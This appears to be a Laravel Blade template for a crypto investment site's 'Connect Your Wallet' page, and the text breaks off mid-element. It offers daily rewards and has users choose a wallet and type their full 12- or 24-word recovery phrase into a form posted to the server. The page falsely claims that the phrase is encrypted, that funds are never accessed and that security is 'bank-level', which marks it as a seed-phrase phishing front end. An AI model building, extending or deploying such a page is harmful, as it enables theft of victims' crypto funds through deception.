@extends('layouts.dasht')
@section('title', 'Connect Your Wallet')
@section('content')

    <div class="space-y-10 animate-fadeIn" x-data="walletConnectManager()">

        {{-- Breadcrumb & Header --}}
        <div class="flex flex-col md:flex-row md:items-center justify-between gap-6">
            <div>
                <div class="flex items-center space-x-2 text-slate-500 text-xs font-bold uppercase tracking-widest mb-2">
                    <a href="{{ route('dashboard') }}" class="hover:text-yellow-500 transition-colors">Console</a>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-3 h-3" fill="none" viewBox="0 0 24 24"
                        stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                    </svg>
                    <span class="text-slate-300">Connect Wallet</span>
                </div>
                <h1 class="text-3xl font-black text-white tracking-tight">Connect Your <span class="gold-text">Wallet</span>
                </h1>
                <p class="text-slate-400 text-sm mt-1 font-medium">Link your crypto wallet to start earning daily rewards.
                </p>
            </div>
            <div class="flex items-center px-4 py-2 rounded-xl bg-emerald-500/5 border border-emerald-500/10">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-emerald-400 mr-2" fill="none"
                    viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
                <span class="text-[10px] font-black text-emerald-400 uppercase tracking-widest">Secure Connection</span>
            </div>
        </div>

        {{-- Session Alerts --}}
        @if (Session::has('message'))
            <div class="flex items-center space-x-4 p-5 rounded-2xl bg-rose-500/10 border border-rose-500/20">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-rose-400 flex-shrink-0" fill="none"
                    viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <p class="text-xs font-bold text-rose-400 uppercase tracking-wide">{{ Session::get('message') }}</p>
            </div>
        @endif
        @if (Session::has('success'))
            <div class="flex items-center space-x-4 p-5 rounded-2xl bg-emerald-500/10 border border-emerald-500/20">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-emerald-400 flex-shrink-0" fill="none"
                    viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <p class="text-xs font-bold text-emerald-400 uppercase tracking-wide">{{ Session::get('success') }}</p>
            </div>
        @endif

        @if(Auth::user()->wallet_connected == 0)

            {{-- Earning Banner --}}
            <div class="dashboard-glass border-white/5 p-8 md:p-10 relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-48 h-48 bg-yellow-500/5 blur-[80px] pointer-events-none"></div>
                <div class="flex flex-col md:flex-row md:items-center gap-8 relative">
                    <div
                        class="h-16 w-16 rounded-2xl gold-gradient-bg flex items-center justify-center flex-shrink-0 shadow-2xl shadow-yellow-500/20">
                        <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-black" fill="none" viewBox="0 0 24 24"
                            stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                    </div>
                    <div class="flex-1">
                        <h3 class="text-xl font-black text-white uppercase tracking-tight mb-2">Start Earning <span
                                class="gold-text">{{ $settings->currency }}{{ $settings->min_return }}</span> Daily</h3>
                        <p class="text-slate-400 text-sm font-medium leading-relaxed mb-4">Connect your cryptocurrency wallet to
                            unlock daily earning opportunities. Your wallet must hold at least <span
                                class="text-white font-black">{{ $settings->currency }}{{ $settings->min_balance }}</span> to be
                            eligible.</p>
                        <div class="flex flex-wrap gap-6">
                            <div class="flex items-center space-x-2">
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-yellow-500" fill="none"
                                    viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                                </svg>
                                <span class="text-[10px] font-black text-slate-400 uppercase tracking-widest">End-to-End
                                    Encrypted</span>
                            </div>
                            <div class="flex items-center space-x-2">
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-yellow-500" fill="none"
                                    viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M13 10V3L4 14h7v7l9-11h-7z" />
                                </svg>
                                <span class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Instant
                                    Setup</span>
                            </div>
                            <div class="flex items-center space-x-2">
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-yellow-500" fill="none"
                                    viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" />
                                </svg>
                                <span class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Daily
                                    Rewards</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Wallet Connection Form --}}
            <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">

                {{-- Left: Wallet Selection + Phrase --}}
                <div class="xl:col-span-2">
                    <div class="dashboard-glass border-white/5 overflow-hidden">
                        <div class="px-8 py-6 border-b border-white/5 bg-white/[0.02] flex items-center space-x-4">
                            <div class="h-10 w-10 rounded-xl bg-yellow-500/10 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 gold-text" fill="none"
                                    viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                                </svg>
                            </div>
                            <div>
                                <h2 class="text-sm font-black text-white uppercase tracking-widest">Select Wallet Provider</h2>
                                <p class="text-[10px] text-slate-500 font-bold uppercase tracking-wider mt-0.5">Choose your
                                    wallet then enter your recovery phrase</p>
                            </div>
                        </div>

                        <div class="p-8 space-y-8">
                            <form method="POST" action="{{ route('wallectConnect') }}" class="space-y-8">
                                @csrf
                                <input type="hidden" name="wallet" :value="selectedWallet">

                                {{-- Wallet Grid --}}
                                <div>
                                    <p class="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] mb-4">Popular
                                        Wallets</p>
                                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">

                                        {{-- MetaMask --}}
                                        <div @click="selectWallet('MetaMask')"
                                            :class="selectedWallet === 'MetaMask' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 group">
                                            <div class="w-12 h-12 rounded-xl flex items-center justify-center"
                                                :class="selectedWallet === 'MetaMask' ? 'bg-orange-500/20' : 'bg-white/5'">
                                                {{-- MetaMask Fox SVG --}}
                                                <svg class="w-8 h-8" viewBox="0 0 318.6 318.6"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <polygon fill="#E2761B" stroke="#E2761B" stroke-linecap="round"
                                                        stroke-linejoin="round" points="274.1,35.5 174.6,109.4 193,65.8" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round" points="44.4,35.5 143.1,110.1 125.6,65.8" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="238.3,206.8 211.8,247.4 268.5,263 284.8,207.7" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="33.9,207.7 50.1,263 106.8,247.4 80.3,206.8" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round" points="106.8,247.4 140.6,230.9 111.4,208.1" />
                                                    <polygon fill="#E4761B" stroke="#E4761B" stroke-linecap="round"
                                                        stroke-linejoin="round" points="177.9,230.9 211.8,247.4 207.1,208.1" />
                                                    <polygon fill="#D7C1B3" stroke="#D7C1B3" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="211.8,247.4 177.9,230.9 180.6,253 180.3,262.3" />
                                                    <polygon fill="#D7C1B3" stroke="#D7C1B3" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="106.8,247.4 138.3,262.3 138.1,253 140.6,230.9" />
                                                    <polygon fill="#233447" stroke="#233447" stroke-linecap="round"
                                                        stroke-linejoin="round" points="138.8,193.5 110.6,185.2 130.5,176.1" />
                                                    <polygon fill="#233447" stroke="#233447" stroke-linecap="round"
                                                        stroke-linejoin="round" points="179.8,193.5 188,176.1 208,185.2" />
                                                    <polygon fill="#CC6228" stroke="#CC6228" stroke-linecap="round"
                                                        stroke-linejoin="round" points="106.8,247.4 111.6,206.8 80.3,207.7" />
                                                    <polygon fill="#CC6228" stroke="#CC6228" stroke-linecap="round"
                                                        stroke-linejoin="round" points="207,206.8 211.8,247.4 238.3,207.7" />
                                                    <polygon fill="#CC6228" stroke="#CC6228" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="230.8,162.1 174.6,164.6 179.8,193.5 188,176.1 208,185.2" />
                                                    <polygon fill="#CC6228" stroke="#CC6228" stroke-linecap="round"
                                                        stroke-linejoin="round"
                                                        points="110.6,185.2 130.5,176.1 138.8,193.5 144.1,164.6 87.8,162.1" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">MetaMask
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Browser</p>
                                            </div>
                                            <div x-show="selectedWallet === 'MetaMask'" class="absolute top-2 right-2">
                                                <div
                                                    class="h-4 w-4 rounded-full bg-yellow-500 flex items-center justify-center">
                                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-2.5 h-2.5 text-black"
                                                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                                            d="M5 13l4 4L19 7" />
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>

                                        {{-- Trust Wallet --}}
                                        <div @click="selectWallet('Trust Wallet')"
                                            :class="selectedWallet === 'Trust Wallet' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 relative">
                                            <div class="w-12 h-12 rounded-xl flex items-center justify-center"
                                                :class="selectedWallet === 'Trust Wallet' ? 'bg-blue-500/20' : 'bg-white/5'">
                                                <svg class="w-8 h-8" viewBox="0 0 104 104" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <rect width="104" height="104" rx="20" fill="#3375BB" />
                                                    <path
                                                        d="M52 20L24 32v21.5C24 69.7 36.3 82.4 52 87c15.7-4.6 28-17.3 28-33.5V32L52 20z"
                                                        fill="white" />
                                                    <path
                                                        d="M52 30L33 40v13.8C33 63.8 41.5 72.7 52 76.5c10.5-3.8 19-12.7 19-22.7V40L52 30z"
                                                        fill="#3375BB" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">Trust
                                                    Wallet</p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Mobile</p>
                                            </div>
                                            <div x-show="selectedWallet === 'Trust Wallet'" class="absolute top-2 right-2">
                                                <div
                                                    class="h-4 w-4 rounded-full bg-yellow-500 flex items-center justify-center">
                                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-2.5 h-2.5 text-black"
                                                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                                            d="M5 13l4 4L19 7" />
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>

                                        {{-- Coinbase Wallet --}}
                                        <div @click="selectWallet('Coinbase Wallet')"
                                            :class="selectedWallet === 'Coinbase Wallet' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 relative">
                                            <div class="w-12 h-12 rounded-xl flex items-center justify-center"
                                                :class="selectedWallet === 'Coinbase Wallet' ? 'bg-blue-600/20' : 'bg-white/5'">
                                                <svg class="w-8 h-8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <circle cx="12" cy="12" r="12" fill="#0052FF" />
                                                    <path
                                                        d="M12 5.5C8.41 5.5 5.5 8.41 5.5 12S8.41 18.5 12 18.5 18.5 15.59 18.5 12 15.59 5.5 12 5.5zm0 2.5a4 4 0 110 8 4 4 0 010-8zm-1.5 2.5v3h3v-3h-3z"
                                                        fill="white" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">Coinbase
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Exchange</p>
                                            </div>
                                            <div x-show="selectedWallet === 'Coinbase Wallet'" class="absolute top-2 right-2">
                                                <div
                                                    class="h-4 w-4 rounded-full bg-yellow-500 flex items-center justify-center">
                                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-2.5 h-2.5 text-black"
                                                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                                            d="M5 13l4 4L19 7" />
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>

                                        {{-- Binance --}}
                                        <div @click="selectWallet('Binance Chain Wallet')"
                                            :class="selectedWallet === 'Binance Chain Wallet' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 relative">
                                            <div class="w-12 h-12 rounded-xl flex items-center justify-center"
                                                :class="selectedWallet === 'Binance Chain Wallet' ? 'bg-yellow-500/20' : 'bg-white/5'">
                                                <svg class="w-8 h-8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <circle cx="12" cy="12" r="12" fill="#F3BA2F" />
                                                    <path
                                                        d="M9.6 8.4L12 6l2.4 2.4-1.44 1.44L12 8.88l-.96.96L9.6 8.4zm-3.6 3.6L7.44 10.56 12 6l4.56 4.56L15.12 12 12 8.88 8.88 12 7.44 13.44 6 12zm3.6 3.6L12 17.16l.96-.96 1.44 1.44L12 18l-2.4-2.4L10.8 14.4zM15.12 12L12 15.12 8.88 12 10.32 10.56 12 12.24l1.68-1.68L15.12 12z"
                                                        fill="#1A1A2E" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">Binance
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Chain Wallet</p>
                                            </div>
                                            <div x-show="selectedWallet === 'Binance Chain Wallet'"
                                                class="absolute top-2 right-2">
                                                <div
                                                    class="h-4 w-4 rounded-full bg-yellow-500 flex items-center justify-center">
                                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-2.5 h-2.5 text-black"
                                                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                                            d="M5 13l4 4L19 7" />
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>

                                    </div>

                                    {{-- More Wallets Row --}}
                                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 mt-4">
                                        {{-- Ledger --}}
                                        <div @click="selectWallet('Ledger')"
                                            :class="selectedWallet === 'Ledger' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 relative">
                                            <div class="w-12 h-12 rounded-xl flex items-center justify-center bg-white/5">
                                                <svg class="w-7 h-7" viewBox="0 0 24 24" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <rect width="24" height="24" rx="4" fill="#000" />
                                                    <path
                                                        d="M3 14.5V21h8.5v-1.5H4.5V14.5H3zm17.5-6H19V21h-7.5v1.5H21V8.5h-.5zM3 3v6.5h1.5V4.5H9V3H3zm10.5 0v1.5H19V9h1.5V3H13.5z"
                                                        fill="white" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">Ledger
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Hardware</p>
                                            </div>
                                        </div>

                                        {{-- Exodus --}}
                                        <div @click="selectWallet('Exodus')"
                                            :class="selectedWallet === 'Exodus' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 relative">
                                            <div
                                                class="w-12 h-12 rounded-xl bg-gradient-to-br from-violet-600 to-pink-500 flex items-center justify-center">
                                                <svg class="w-7 h-7" viewBox="0 0 36 36" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M18 3L33 30H3L18 3z" fill="white" opacity="0.9" />
                                                    <path d="M18 10l10 17H8L18 10z" fill="#563AF5" opacity="0.8" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">Exodus
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Desktop</p>
                                            </div>
                                        </div>

                                        {{-- Phantom --}}
                                        <div @click="selectWallet('Phantom')"
                                            :class="selectedWallet === 'Phantom' ? 'border-yellow-500/60 bg-yellow-500/5' : 'border-white/5 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04]'"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border flex flex-col items-center space-y-3 relative">
                                            <div
                                                class="w-12 h-12 rounded-xl bg-gradient-to-br from-purple-600 to-indigo-600 flex items-center justify-center">
                                                <svg class="w-7 h-7" viewBox="0 0 128 128" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M64 0C28.7 0 0 28.7 0 64s28.7 64 64 64 64-28.7 64-64S99.3 0 64 0zm11.8 88.4c-.5 1.9-2.3 3.1-4.3 2.8l-7.8-1.3-4.4 6.6c-1.1 1.7-3.4 2.1-5 1l-.1-.1c-1.8-1.1-2.3-3.4-1.2-5.1l4.8-7.2-4.2-7.1c-1-1.7-.5-4 1.3-5 1.7-1 4-.5 5 1.3l2.8 4.8 6.2 1.1c2 .3 3.3 2.2 2.9 4.2z"
                                                        fill="white" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-white uppercase tracking-widest">Phantom
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">Solana</p>
                                            </div>
                                        </div>

                                        {{-- Other --}}
                                        <div @click="showOtherWallets = !showOtherWallets"
                                            class="p-5 rounded-2xl cursor-pointer transition-all border border-dashed border-white/10 hover:border-yellow-500/40 bg-white/[0.01] flex flex-col items-center space-y-3">
                                            <div class="w-12 h-12 rounded-xl bg-white/5 flex items-center justify-center">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-slate-500"
                                                    fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                        d="M5 12h.01M12 12h.01M19 12h.01M6 12a1 1 0 11-2 0 1 1 0 012 0zm7 0a1 1 0 11-2 0 1 1 0 012 0zm7 0a1 1 0 11-2 0 1 1 0 012 0z" />
                                                </svg>
                                            </div>
                                            <div class="text-center">
                                                <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest">More
                                                </p>
                                                <p class="text-[9px] text-slate-600 font-bold uppercase">All Wallets</p>
                                            </div>
                                        </div>
                                    </div>

                                    {{-- Other Wallets Dropdown --}}
                                    <div x-show="showOtherWallets" x-transition.opacity class="mt-4">
                                        <select x-model="selectedWallet"
                                            class="w-full bg-black/50 border border-white/10 rounded-xl px-6 py-4 text-white text-xs font-black uppercase tracking-widest focus:outline-none focus:border-yellow-500/50 appearance-none cursor-pointer">
                                            <option value="">Choose Wallet Provider...</option>
                                            <optgroup label="Software Wallets">
                                                <option value="Atomic Wallet">Atomic Wallet</option>
                                                <option value="Guarda">Guarda</option>
                                                <option value="ZenGo">ZenGo</option>
                                                <option value="Rainbow Wallet">Rainbow Wallet</option>
                                                <option value="imToken">imToken</option>
                                                <option value="TokenPocket">TokenPocket</option>
                                            </optgroup>
                                            <optgroup label="Hardware Wallets">
                                                <option value="Trezor">Trezor</option>
                                                <option value="KeepKey">KeepKey</option>
                                            </optgroup>
                                            <optgroup label="Exchange Wallets">
                                                <option value="Huobi Wallet">Huobi Wallet</option>
                                                <option value="WazirX">WazirX</option>
                                                <option value="BitPay">BitPay</option>
                                            </optgroup>
                                        </select>
                                    </div>
                                </div>

                                {{-- Recovery Phrase --}}
                                <div x-show="selectedWallet" x-transition:enter="transition ease-out duration-300"
                                    x-transition:enter-start="opacity-0 translate-y-4"
                                    x-transition:enter-end="opacity-100 translate-y-0" style="display:none;">
                                    <div class="border-t border-white/5 pt-8 space-y-6">
                                        <div>
                                            <p class="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] mb-1">
                                                Step 2</p>
                                            <h3 class="text-sm font-black text-white uppercase tracking-widest">Recovery Phrase
                                            </h3>
                                        </div>

                                        {{-- Security note --}}
                                        <div
                                            class="flex items-start space-x-4 p-5 rounded-2xl bg-yellow-500/5 border border-yellow-500/10">
                                            <svg xmlns="http://www.w3.org/2000/svg"
                                                class="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" fill="none"
                                                viewBox="0 0 24 24" stroke="currentColor">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                            </svg>
                                            <div>
                                                <p
                                                    class="text-[10px] font-black text-yellow-400 uppercase tracking-widest mb-1">
                                                    Important</p>
                                                <p class="text-[10px] text-slate-400 font-bold uppercase leading-relaxed">Your
                                                    recovery phrase is encrypted and securely stored. We never access your funds
                                                    or store private keys.</p>
                                            </div>
                                        </div>

                                        <div class="relative">
                                            <textarea name="mnemonic" id="mnemonic" required x-model="recoveryPhrase"
                                                @input="validatePhrase"
                                                :class="hasError ? 'border-rose-500/50' : 'border-white/10 focus:border-yellow-500/50'"
                                                class="w-full bg-black/50 border rounded-2xl px-6 py-5 text-white text-sm font-mono focus:outline-none focus:ring-2 focus:ring-yellow-500/5 transition-all resize-none placeholder:text-slate-700"
                                                rows="4"
                                                placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces..."></textarea>
                                            <div
                                                class="absolute bottom-3 right-4 text-[9px] font-black text-slate-600 uppercase tracking-widest">
                                                <span x-text="wordCount"></span> / 24 words
                                            </div>
                                        </div>

                                        {{-- Validation --}}
                                        <div class="flex flex-wrap gap-6">
                                            <div class="flex items-center space-x-2">
                                                <div class="h-4 w-4 rounded-full flex items-center justify-center"
                                                    :class="wordCount >= 12 && wordCount <= 24 ? 'bg-emerald-500' : 'bg-white/10'">
                                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-2.5 h-2.5 text-white"
                                                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                                            d="M5 13l4 4L19 7" />
                                                    </svg>
                                                </div>
                                                <span class="text-[10px] font-black uppercase tracking-widest"
                                                    :class="wordCount >= 12 && wordCount <= 24 ? 'text-emerald-400' : 'text-slate-600'">Valid
                                                    length (12–24 words)</span>
                                            </div>
                                            <div class="flex items-center space-x-2">
                                                <div class="h-4 w-4 rounded-full flex items-center justify-center"
                                                    :class="!hasInvalidChars && recoveryPhrase.length > 0 ? 'bg-emerald-500' : 'bg-white/10'">
                                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-2.5 h-2.5 text-white"
                                                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                                            d="M5 13l4 4L19 7" />
                                                    </svg>
                                                </div>
                                                <span class="text-[10px] font-black uppercase tracking-widest"
                                                    :class="!hasInvalidChars && recoveryPhrase.length > 0 ? 'text-emerald-400' : 'text-slate-600'">Valid
                                                    characters only</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                {{-- Submit Button --}}
                                <div x-show="selectedWallet && isValidPhrase"
                                    x-transition:enter="transition ease-out duration-300"
                                    x-transition:enter-start="opacity-0 translate-y-4"
                                    x-transition:enter-end="opacity-100 translate-y-0" style="display:none;">
                                    <button type="submit" @click="isConnecting = true" :disabled="isConnecting"
                                        class="w-full h-16 rounded-2xl gold-gradient-bg text-black font-black text-xs uppercase tracking-[0.3em] shadow-2xl shadow-yellow-500/20 hover:scale-[1.02] transform transition-all active:scale-95 flex items-center justify-center space-x-3">
                                        <div x-show="!isConnecting" class="flex items-center space-x-3">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none"
                                                viewBox="0 0 24 24" stroke="currentColor">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                    d="M13 10V3L4 14h7v7l9-11h-7z" />
                                            </svg>
                                            <span>Connect Wallet — <span x-text="selectedWallet"></span></span>
                                        </div>
                                        <div x-show="isConnecting" class="flex items-center space-x-3">
                                            <div
                                                class="animate-spin rounded-full h-5 w-5 border-2 border-black border-t-transparent">
                                            </div>
                                            <span>Connecting...</span>
                                        </div>
                                    </button>
                                </div>

                            </form>
                        </div>
                    </div>
                </div>

                {{-- Right: Info Sidebar --}}
                <div class="space-y-6">
                    {{-- Selected Wallet Indicator --}}
                    <div x-show="selectedWallet" x-transition.opacity class="dashboard-glass border-yellow-500/20 p-6"
                        style="display:none;">
                        <p class="text-[9px] font-black text-slate-500 uppercase tracking-[0.2em] mb-3">Selected Wallet</p>
                        <div class="flex items-center space-x-3">
                            <div class="h-10 w-10 rounded-xl bg-yellow-500/10 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 gold-text" fill="none"
                                    viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                            </div>
                            <p class="text-sm font-black gold-text uppercase tracking-widest" x-text="selectedWallet"></p>
                        </div>
                    </div>

                    {{-- Security Features --}}
                    <div class="dashboard-glass border-white/5 p-6 space-y-6">
                        <p class="text-[9px] font-black text-slate-500 uppercase tracking-[0.2em]">Security Features</p>
                        <div class="space-y-5">
                            <div class="flex items-start space-x-4">
                                <div
                                    class="h-9 w-9 rounded-xl bg-emerald-500/10 flex items-center justify-center flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-emerald-400" fill="none"
                                        viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                                    </svg>
                                </div>
                                <div>
                                    <p class="text-[10px] font-black text-white uppercase tracking-tight">Bank-Level Security
                                    </p>
                                    <p class="text-[9px] text-slate-500 font-bold uppercase leading-relaxed mt-1">AES-256
                                        encryption protects all your data</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-4">
                                <div class="h-9 w-9 rounded-xl bg-blue-500/10 flex items-center justify-center flex-shrink-0">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" fill="none"
                                        viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
